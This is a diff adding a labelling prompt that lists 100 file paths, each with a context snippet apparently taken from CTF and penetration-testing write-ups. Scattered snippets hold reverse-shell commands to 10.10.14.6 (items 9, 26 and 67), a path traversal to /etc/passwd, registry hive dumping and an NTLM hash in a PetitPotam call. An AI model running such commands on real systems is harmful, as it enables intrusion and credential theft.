@@ -1,0 +1,203 @@
+Label these 100 paths (chunk 4/15).
+Reply with one jsonl code block, one record per path, in input order.
+
+1. C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\F1D30FCB0100
+   context: \scripts\A32FF3AEAA23\CED022B22EBA RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\D0ECECBC1CCF RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\F1D30FCB0100 RW C:\Windows\SYSVOL\domain\scripts\A32FF
+2. /logs/uploads/info.pdf.php
+   context: /logs/uploads/info.pdf.php
+3. C:\Users\
+   context: C:\Users\
+4. /source/root
+   context: /source/root
+5. C:\Users\webuser
+   context: Version 10.0.17763.2803] (c) 2018 Microsoft Corporation. All rights reserved.   webuser@PERSPECTIVE C:\Users\webuser>
+6. C:\Users\adam.scott\Desktop
+   context: evil-winrm-py PS C:\Users\adam.scott\Desktop> cat user.txt fcebc703************************
+7. /furni.htb/static/images/products/4.png
+   context: 510519c http://furni.htb/static/images/blogs/3.jpg 200      GET      466l     2775w   216716c http://furni.htb/static/images/products/4.png 200      GET      513l     2968w   364489c http://furni.htb/
+8. C:\Users\Administrator\Documents\db_cleanup.ps1
+   context: C:\Users\Administrator\Documents\db_cleanup.ps1
+9. /openwebanalytics.vessel.htb/owa-data/logs/0xdf.php
+   context: http://openwebanalytics.vessel.htb/owa-data/logs/0xdf.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.6/443%200%3E%261%27
+10. C:\programdata\0xdf-transcript.txt
+   context: C:\programdata\0xdf-transcript.txt
+11. /var/www/html/racers
+   context: ocess group (1139): Inappropriate ioctl for device bash: no job control in this shell www-data@race:/var/www/html/racers$
+12. C:\Users\svc_winrm\desktop
+   context: *Evil-WinRM* PS C:\Users\svc_winrm\desktop> type user.txt fc0072d8************************
+13. /ten.vl/dist/css/bootstrap.min.css
+   context: 855c http://ten.vl/dist/js/bootstrap.bundle.min.js 200      GET        7l     1966w   155758c http://ten.vl/dist/css/bootstrap.min.css 200      GET      199l     1208w   122095c http://ten.vl/dist/img
+14. /usr/local/share/race-scripts
+   context: wxrwxr-x 2 max  max  4096 Dec  4  2023 bin lrwxrwxrwx 1 max  max    29 Dec  9  2023 race-scripts -> /usr/local/share/race-scripts -rw-r----- 1 root max    33 Apr 16 04:17 user.txt
+15. C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\C20F1322FB3C
+   context: \scripts\A32FF3AEAA23\BE11A3E0EA13 RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\BFDDF0E1B33E RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\C20F1322FB3C RW C:\Windows\SYSVOL\domain\scripts\A32FF
+16. C:\programdata\Powermad.ps1
+   context: PS C:\programdata> upload /opt/Powermad/Powermad.ps1 Info: Uploading /opt/Powermad/Powermad.ps1 to C:\programdata\Powermad.ps1  Data: 180780 bytes of 180780 bytes copied  Info: Upload successful!  *Ev
+17. \\office.htb\SysVol\office.htb\Policies
+   context: 8 [+] GUID of "Windows Firewall GPO" is: {04FE5C75-0078-4D44-97C5-8A796BE906EC} Access to the path '\\office.htb\SysVol\office.htb\Policies\{04FE5C75-0078-4D44-97C5-8A796BE906EC}\Machine\Microsoft\Win
+18. C:\Windows\System32\svchost.exe
+   context: ----  ----              ----  376   656   svchost.exe              x64   1        HOSPITAL\drbrown  C:\Windows\System32\svchost.exe  380   2980  sihost.exe               x64   1        HOSPITAL\drbrow
+19. C:\Users\blake\Documents\app
+   context: sudo rlwrap -cAr nc -lvnp 443 Listening on 0.0.0.0 443 Connection received on 10.10.11.16 63912  PS C:\Users\blake\Documents\app>
+20. /var/../root
+   context: martin@code:~$ echo '{"other_key": true, "directories_to_archive":["/var/../root"]}' | jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' {   "other_key": true,   "directorie
+21. \\.\Reaper
+   context: PS C:\Users\keysvc\Desktop> .\driver_poc.exe \\.\Reaper set 1234 15 [+] IOCTL 0x80002003 sent successfully PS C:\Users\keysvc\Desktop> .\driver_poc.exe \\.
+22. /opt/netdata/usr/share/netdata/web
+   context: ta/usr/libexec/netdata/plugins.d     Static Web Files ___________________________________________ : /opt/netdata/usr/share/netdata/web     Log Files __________________________________________________ 
+23. C:\Windows\System32\spool\drivers\color\
+   context: n Path="C:                      \Windows\System32\spool\drivers\color:*" /><FilePathCondition Path="C:\Windows\System32\spool\drivers\color\*" /><FilePathCondition Path="C:\Windows\System32\spool\PRIN
+24. /root/eaphammer/certs/server/AirTouch
+   context: certificate chain to file... [CW] Complete! [CW] Private key and full certificate chain written to: /root/eaphammer/certs/server/AirTouch CA.pem [CW] Activating full certificate chain... [CW] Complete
+25. C:\Users\taylor.b.adm\Documents
+   context: |_|   |__/  v1.4.1  [*] Connecting to 'dc-01:5985' as 'taylor.b.adm' evil-winrm-py PS C:\Users\taylor.b.adm\Documents>
+26. C:\ProgramData\nc64.exe
+   context: oxdf@hacky$ python /opt/CVE-2023-2255/CVE-2023-2255.py --cmd 'cmd.exe /c C:\ProgramData\nc64.exe -e cmd.exe 10.10.14.6 443' --output exploit.odt File exploit.odt has been created !
+27. /home/cbrown/0xdf
+   context: /home/cbrown/0xdf
+28. /root/bin/update-stats.sh
+   context: | /usr/bin/python3 /root/bin/cleanup.py  2025/08/07 01:12:01 CMD: UID=0     PID=36223  | /bin/bash /root/bin/update-stats.sh  2025/08/07 01:12:01 CMD: UID=0     PID=36224  | /bin/bash /root/bin/update
+29. /root/diagnostic_files/diagnostic_
+   context: SAVE == "true" ]]; then     exit; else     timestamp=$(/usr/bin/date +%s)     /usr/bin/echo $data > /root/diagnostic_files/diagnostic_${timestamp}.xml fi
+30. /faculty.htb/admin/login.php
+   context: 0l        0w        0c http://faculty.htb/test.php 200      GET      175l      311w        0c http://faculty.htb/admin/login.php ...[snip]... 301      GET        7l       12w      178c http://faculty.
+31. c:\Users
+   context: c:\Users>dir  Volume in drive C has no label.  Volume Serial Number is BE61-D5E0   Directory of c:\Users  02
+32. /default/core/cron.php
+   context: t               bootstrapping Backdrop. To execute Backdrop's cron.php, specify               http://default/core/cron.php as the URI. To run this script without --root argument invoke it from the roo
+33. C:\Windows\Registration\CRMLog\
+   context: s><Exceptions><FilePathCondition Path="C:\Windows\Registration\CRMLog:*" /><FilePathCondition Path="C:\Windows\Registration\CRMLog\*" /><FilePathCondition Path="C:\Windows\System32\com\dmp:*" /><FileP
+34. c:\datastore\acl\admin.json.db
+   context: ent file on \programdata\api.config.yaml. [ERROR] 2025-07-27T04:01:58-07:00 Unable to open file \\?\c:\datastore\acl\admin.json.db: open \\?\c:\datastore\acl\admin.json.db: Access is denied.  velocira
+35. C:\ProgramData\Microsoft\Windows
+   context: tem32\failover.exe ResolutionHost Windows Defender Cache Maintenance                SYSTEM          C:\ProgramData\Microsoft\Windows Defender\Platform\... Windows Defender Cleanup                     
+36. C:\programdata\SECURITY.save
+   context: S C:\programdata> download SECURITY.save                                          Info: Downloading C:\programdata\SECURITY.save to SECURITY.save                                          Info: Downloa
+37. C:\Windows\System32\FxsTmp\
+   context: em32\com\dmp\*" /><FilePathCondition Path="C:\Windows\System32\FxsTmp:*" /><FilePathCondition Path="C:\Windows\System32\FxsTmp\*" /><FilePathCondition Path="C:   \Windows\System32\Microsoft\Crypto\DSS
+38. C:\Windows\System32\Microsoft\Crypto\DSS\MachineKeys:\
+   context: ndition Path="C:   \Windows\System32\Microsoft\Crypto\DSS\MachineKeys:*" /><FilePathCondition Path="C:\Windows\System32\Microsoft\Crypto\DSS\MachineKeys:\*" /><FilePathCondition Path="C:\Windows\Syste
+39. /var/www/market
+   context: listen 80;         listen [::]:80;          server_name preprod-marketing.trick.htb;          root /var/www/market;         index index.php;          location / {                 try_files $uri $uri/ 
+40. /tmp/restic-check-cache-2056660737
+   context: bob@ebdce80611e9:~$ sudo restic check --password-command 'touch /tmp/0xdf' using temporary cache in /tmp/restic-check-cache-2056660737 Fatal: Please specify repository location (-r or --repository-fil
+41. /install/index.php
+   context: <?php // Chamilo version 1.11.24 // File generated by /install/index.php script - Sat, 20 Jan 2024 18:20:32 +0000
+42. /usr/local/tomcat/webapps
+   context: PY strutted /tmp/strutted WORKDIR /tmp/strutted  RUN mvn clean package  FROM tomcat:9.0  RUN rm -rf /usr/local/tomcat/webapps/ RUN mv /usr/local/tomcat/webapps.dist/ /usr/local/tomcat/webapps/ RUN rm 
+43. C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\3CFD3DD1BCFA
+   context: 0013FEFE RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\3A3ED3232FEB RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\3CFD3DD1BCFA RW C:\Windows\S
+44. C:\Windows\System32\Tasks\Microsoft\Windows\WindowsColorSystem\Calibration
+   context: ystem32\Tasks\Microsoft\Windows\WindowsColorSystem\Calibration Loader:*" /><FilePathCondition Path="C:\Windows\System32\Tasks\Microsoft\Windows\WindowsColorSystem\Calibration Loader\*" /><FilePathCond
+45. /root/font_cache/dompdf_font_family_cache.php.bak
+   context: #! /bin/bash find /var/www/api/vendor/dompdf/dompdf/lib/fonts/ -type f -cmin -5 -exec rm {} \; cp /root/font_cache/dompdf_font_family_cache.php.bak /root/font_cache/dompdf_font_family_cache.php chown 
+46. c:\Users\svc_minecraft\Desktop
+   context: c:\Users\svc_minecraft\Desktop> type user.txt 65b4f5a4************************
+47. /git.sorcery.htb/assets/img/logo.svg
+   context: 2.1               << 304 Not Modified 0b                                127.0.0.1:56618: GET https://git.sorcery.htb/assets/img/logo.svg               << 304 Not Modified 0b 127.0.0.1:56630: GET https
+48. /etc/nsswitch.conf
+   context: NOENT (No such file or directory) close(52)                               = 0 newfstatat(AT_FDCWD, "/etc/nsswitch.conf", {st_mode=S_IFREG|0644, st_size=665, ...}, 0) = 0 newfstatat(AT_FDCWD, "/", {st_
+49. C:\Users\ruben\AppData\System32\iis.ps1
+   context: C:\> (get-scheduledtask -taskname iishelper).Actions  Id               :  Arguments        : -File C:\Users\ruben\AppData\System32\iis.ps1 Execute          : powershell.exe WorkingDirectory :  PSCompu
+50. /opt/PetitPotam/PetitPotam.py
+   context: oxdf@hacky$ proxychains python /opt/PetitPotam/PetitPotam.py -u brandon.keywarp -hashes :DB03D6A77A2205BC1D07082740626CC9 -d mist.htb 'MS01@22301/whatever' 192.
+51. /var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_011
+   context: file or directory (2) [2415:2418:0309/174909.482841:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_011": No such file or director
+52. /home/martin/.python_history
+   context: member names /home/martin/ /home/martin/.local/ /home/martin/.sqlite_history /home/martin/.profile /home/martin/.python_history /home/martin/backups/ /home/martin/backups/task.json /home/martin/backup
+53. /var/tmp/django_cache
+   context: ': {         'BACKEND': 'django.core.cache.backends.filebased.FileBasedCache',         'LOCATION': '/var/tmp/django_cache',         'TIMEOUT': 60,         'OPTIONS': {'MAX_ENTRIES': 1000},            
+54. C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\DE3FC3AD20F0
+   context: DDE211FE RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\C2FE12102303 RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\DE3FC3AD20F0 RW C:\Windows\S
+55. C:\Users\Administrator\Documents\cleanup
+   context: evil-winrm-py PS C:\Users\Administrator\Documents\cleanup> Start-ScheduledTask -TaskName CleanupScript evil-winrm-py PS C:\Users\Administrator\Documents\clea
+56. C:\Users\gideon.hamill
+   context: PS C:\Users\gideon.hamill> tree . /f Folder PATH listing Volume serial number is 000001C4 BFF7:F940 C:\USERS\GIDEON.HAMILL +-
+57. C:\windows\temp\SYSTEM.save
+   context: start trough named pipe... [*] Saved HKLM\SAM to C:\windows\temp\SAM.save [*] Saved HKLM\SYSTEM to C:\windows\temp\SYSTEM.save [*] Saved HKLM\SECURITY to C:\windows\temp\SECURITY.save
+58. /home/app/app/app.py
+   context: home /home/app /home/app/app /home/app/app/__pycache__ /home/app/app/__pycache__/app.cpython-38.pyc /home/app/app/app.py /home/app/app/instance /home/app/app/instance/users.db /home/app/app/requiremen
+59. /def/shm/exp.sh
+   context: rmitted ethan@vessel:/dev/shm$ cat /proc/sys/kernel/core_pattern /proc/sys/kernel/shm_rmid_forced  |/def/shm/exp.sh # 1
+60. /opt/scripts/admin.keytab
+   context: #!/bin/bash  export KRB5CCNAME=/tmp/krb5cc_admin_cron kinit -k -t /opt/scripts/admin.keytab admin  split() {     awk -F: '{ print $2 }' | tr -d ' ' | tr ',' '\n' }  sysadmins=$(ipa group-show
+61. C:\Users\adam.scott
+   context: evil-winrm-py PS C:\Users\adam.scott> tree /f . Folder PATH listing Volume serial number is E154-392A C:\USERS\ADAM.SCOTT +---Desktop ¦
+62. C:\Users\user
+   context: e UIDs; or on Windows, HOME\AppData\Roaming\nmap (where HOME is     the user's home directory, like C:\Users\user). This is followed by the location of the nmap executable     and the same location wi
+63. /opt/tomcat/bin/shutdown.sh
+   context: adless=true -Djava.security.egd=file:/dev/./urandom'  ExecStart=/opt/tomcat/bin/startup.sh ExecStop=/opt/tomcat/bin/shutdown.sh  User=tomcat Group=tomcat UMask=0007 RestartSec=10 Restart=always  [Inst
+64. /blog.bigbang.htb/index.php
+   context: : Thu, 30 Jan 2025 02:54:38 GMT Server: Apache/2.4.62 (Debian) X-Powered-By: PHP/8.3.2 Link: <http://blog.bigbang.htb/index.php?rest_route=/>; rel="https://api.w.org/" Vary: Accept-Encoding Content-Le
+65. /usr/bin/groups
+   context: te-dev private-bin /usr/bin/python3,/usr/local/bin/gpg,/bin/bash,/usr/bin/flask,/usr/local/sbin/gpg,/usr/bin/groups,/usr/bin/base64,/usr/bin/lesspipe,/usr/bin/basename,/usr/bin/filename,/usr/bin/bash,
+66. /root/start.sh
+   context: 10   0:23 tail -f /dev/null root          28  0.0  0.0   3976  3076 ?        Ss   Apr10   0:00 bash /root/start.sh root          45  0.1  0.1  10624  7972 ?        S    Apr10   5:27 hostapd_aps /root/
+67. C:\inetpub\testing\0xdf.url
+   context: data> wget 10.10.14.6/rev.exe -outfile 0xdf.exe PS C:\programdata> wget 10.10.14.6/rev.url -outfile C:\inetpub\testing\0xdf.url
+68. /nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php
+   context: oxdf@hacky$ sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php" --data="id=3&action=acknowledge_banner_message" -p id --cookie "nagiosxi=bspu3ilq508jivkicfqofjo29
+69. /root/TeamCity/buildAgent/lib/jackson-core.jar
+   context: /root/TeamCity/buildAgent/lib/plugin-model-common.jar:/root/TeamCity/buildAgent/lib/annotations.jar:/root/TeamCity/buildAgent/lib/jackson-core.jar:/root/TeamCity/buildAgent/lib/server-logging.jar:/roo
+70. C:\Users\emily.oscars.CICADA\Documents
+   context: M6b*7t*Vt'  Evil-WinRM shell v3.5  Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents>
+71. /home/svc-deploy
+   context: y@principal:~$ cat /etc/passwd | grep 'sh$' root:x:0:0:root:/root:/bin/bash svc-deploy:x:1001:1002::/home/svc-deploy:/bin/bash
+72. /opt/SecLists/Fuzzing/alphanum-case-extra.txt
+   context: oxdf@hacky$ ffuf -u http://monitorsfour.htb/user?token=FUZZ -w /opt/SecLists/Fuzzing/alphanum-case-extra.txt -ac          /'___\  /'___\           /'___\               /\ \__/ /\ \__/  __  __  /\ \__/
+73. /stocker.htb/fonts/inter-v12-latin-300.woff2
+   context: 46w    42350c http://stocker.htb/css/theme.min.css 200      GET       55l      383w    31373c http://stocker.htb/fonts/inter-v12-latin-300.woff2 200      GET      122l      561w    41547c http://stock
+74. /home/puma
+   context: Maltrail. Server of malicious traffic d> Jan 04 15:58:22 sau sudo[1270]:     puma : TTY=pts/1 ; PWD=/home/puma ; USER=ro>
+75. /tmp/.Xauthority
+   context: alex@squashed:/home/alex$ curl http://10.10.14.6/.Xauthority -o /tmp/.Xauthority    % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+76. /var/snap/docker/common/var-lib-docker
+   context: 232 79728 ?       Ssl  01:15   0:12 dockerd --group docker --exec-root=/run/snap.docker --data-root=/var/snap/docker/common/var-lib-docker --pidfile=/run/snap.docker/docker.pid --config-file=/var/snap
+77. /root/TeamCity/buildAgent/lib/xz.jar
+   context: ty/buildAgent/lib/coverage-java-agent-common.jar:/root/TeamCity/buildAgent/lib/jackson-databind.jar:/root/TeamCity/buildAgent/lib/xz.jar:/root/TeamCity/buildAgent/lib/jackson-module-jaxb-annotations.j
+78. /dashboard/emergency.php
+   context: /dashboard/emergency.php
+79. /etc/ethers
+   context: rts   /dev/usbmon* r,   /dev/bus/usb/ r,   /dev/bus/usb/** r,    # for init_etherarray(), with -e   /etc/ethers r,    # for USB probing (see libpcap-1.1.x/pcap-usb-linux.c:probe_devices())   /dev/bus/
+80. /permx.htb/about.html
+   context: 899w    14753c http://permx.htb/contact.html 200      GET      367l     1362w    20542c http://permx.htb/about.html 200      GET      208l      701w    10428c http://permx.htb/404.html [##############
+81. /../../../../../etc/passwd
+   context: ../../../../../../etc/passwd
+82. C:\Users\svc_minecraft\Desktop
+   context: sktop> powershell Windows PowerShell  Copyright (C) Microsoft Corporation. All rights reserved.  PS C:\Users\svc_minecraft\Desktop>
+83. /opt/saml.xml
+   context: database: guac_db mysql-username: guac_user mysql-password: guac2024  saml-idp-metadata-url: file:///opt/saml.xml saml-idp-url: http://barrier.vl:9000/application/saml/guac/sso/binding/redirect/ saml-
+84. C:\Tools\KrbRelay\CheckPort\bin\Release\CheckPort.exe
+   context: d... ------ Build started: Project: CheckPort, Configuration: Release Any CPU ------   CheckPort -> C:\Tools\KrbRelay\CheckPort\bin\Release\CheckPort.exe ------ Build started: Project: KrbRelay, Confi
+85. C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0F0FF1F01DBF
+   context: F3AEAA23\FD33C0CE11AC RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10 RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0F0FF1F01DBF RW C:\Windows\SYSVOL\domain\
+86. C:\inetpub\eighteen.htb
+   context: C:\inetpub\eighteen.htb
+87. /eforenzics.htb/service.html
+   context: 208l      629w    10957c http://eforenzics.htb/ 200      GET       91l      227w     4335c http://eforenzics.htb/service.html 200      GET       76l      475w    36057c http://eforenzics.htb/assets/im
+88. /soulmate.htb/profile.php
+   context: 10w      162c http://soulmate.htb/assets/css/ 302      GET        0l        0w        0c http://soulmate.htb/profile.php => http://soulmate.htb/login 301      GET        7l       12w      178c http://
+89. C:\Users\PPotts\AppData\Roaming\Microsoft\Protect
+   context: PS C:\Users\PPotts> gci -force AppData\Roaming\Microsoft\Protect      Directory: C:\Users\PPotts\AppData\Roaming\Microsoft\Protect  Mode                 LastWriteTime         Length Name ----         
+90. /home/oxdf/.local/share/uv/tools/impacket/lib/python3.12/site-packages/impacket/smbconnection.py
+   context: impacket/lib/python3.12/site-packages/impacket/examples/secretsdump.py", line 360, in close   File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.12/site-packages/impacket/smbconnection.py", l
+91. C:\share\Bginfo64.exe
+   context: C:\share\Bginfo64.exe
+92. /portal.guardian.htb/admin/profile.php
+   context: n/chat.php => http://portal.guardian.htb/login.php 302      GET        0l        0w        0c http://portal.guardian.htb/admin/profile.php => http://portal.guardian.htb/login.php 302      GET        0
+93. C:\Users\Raven\Documents
+   context: oP3r!123'  Evil-WinRM shell v3.4  Info: Establishing connection to remote endpoint  *Evil-WinRM* PS C:\Users\Raven\Documents>
+94. /opt/monitoring_site/app.py
+   context: me/app/app.py root        1073  0.0  1.3  35408 27796 ?        Ss   12:01   0:00 /usr/bin/python3.9 /opt/monitoring_site/app.py
+95. /etc/systemd
+   context: /etc/systemd
+96. /var/lib/docker/overlay2/l/YWNFANZGTHCUIML4WUIJ5XNBLJ
+   context: docker/overlay2/l/Z4RNRWTZKMXNQJVSRJE4P2JYHH:/var/lib/docker/overlay2/l/ CXAW6LQU6QOKNSSNURRN2X4JEH:/var/lib/docker/overlay2/l/YWNFANZGTHCUIML4WUIJ5XNBLJ:/var/lib/docker/overlay2/l/JWCZSRNDZSQFHPN75LV
+97. C:\Users\svc_inventory_lnx\Documents
+   context: |_|   |__/  v1.3.0  [*] Connecting to inventory.sweep.vl:5985 as svc_inventory_lnx evil-winrm-py PS C:\Users\svc_inventory_lnx\Documents>
+98. /usr/bin/rsync
+   context: nap/bin, use_pty  User dev may run the following commands on localhost:     (root : root) NOPASSWD: /usr/bin/rsync -a --exclude\=.hg /home/dev/app-production/* /opt/app/
+99. /usr/bin/ldapsearch
+   context: donna_adams@main:~$ which ipa kinit ldapsearch ksu /usr/bin/ipa /usr/bin/kinit /usr/bin/ldapsearch /usr/bin/ksu
+100. /opt/metasploit-framework/embedded/lib/ruby/gems/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb
+   context: nrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems /opt/metasploit-framework/embedded/lib/ruby/gems/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragm
